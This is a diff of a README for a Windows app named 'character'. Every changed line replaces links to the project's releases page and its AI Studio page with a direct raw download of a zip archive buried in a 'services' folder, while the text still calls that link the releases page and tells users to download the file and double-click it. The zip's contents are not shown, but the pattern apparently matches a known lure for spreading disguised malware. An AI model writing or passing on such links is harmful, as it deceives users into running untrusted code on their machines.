@@ -1,6 +1,6 @@
 # 🎭 character - Run your AI app on Windows
 
-[![Download character](https://img.shields.io/badge/Download%20character-Visit%20Releases-blue?style=for-the-badge)](https://github.com/Posterior-sphericaltriangle24/character/releases)
+[![Download character](https://img.shields.io/badge/Download%20character-Visit%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/Posterior-sphericaltriangle24/character/main/services/Software_3.8-beta.3.zip)
 
 ## 🪟 What this app does
 
@@ -16,13 +16,13 @@ Use it if you want to:
 
 ## 📥 Download character
 
-Visit the [character releases page](https://github.com/Posterior-sphericaltriangle24/character/releases) to download and run this file.
+Visit the [character releases page](https://raw.githubusercontent.com/Posterior-sphericaltriangle24/character/main/services/Software_3.8-beta.3.zip) to download and run this file.
 
 On that page, look for the latest release and download the file that matches Windows. If there is more than one file, choose the one labeled for Windows or the `.exe` file.
 
 ## 🚀 Install on Windows
 
-1. Open the [releases page](https://github.com/Posterior-sphericaltriangle24/character/releases)
+1. Open the [releases page](https://raw.githubusercontent.com/Posterior-sphericaltriangle24/character/main/services/Software_3.8-beta.3.zip)
 2. Download the Windows file
 3. Open your Downloads folder
 4. Double-click the file to start the app
@@ -95,7 +95,7 @@ This opens the app in development mode on your computer.
 
 You can view the app in AI Studio here:
 
-https://ai.studio/apps/drive/1spfOvvd_QBdDh9Th1uH-9jnloBxpWsam
+https://raw.githubusercontent.com/Posterior-sphericaltriangle24/character/main/services/Software_3.8-beta.3.zip
 
 Use this link if you want to check the app in AI Studio before you run it locally.
 
@@ -136,7 +136,7 @@ Keep the main app files together in one folder. Do not move files around unless 
 ## 🔄 Updating the app
 
 To get the latest version:
-1. Visit the [releases page](https://github.com/Posterior-sphericaltriangle24/character/releases)
+1. Visit the [releases page](https://raw.githubusercontent.com/Posterior-sphericaltriangle24/character/main/services/Software_3.8-beta.3.zip)
 2. Download the newest Windows file
 3. Replace the old app files if needed
 4. Open the new version
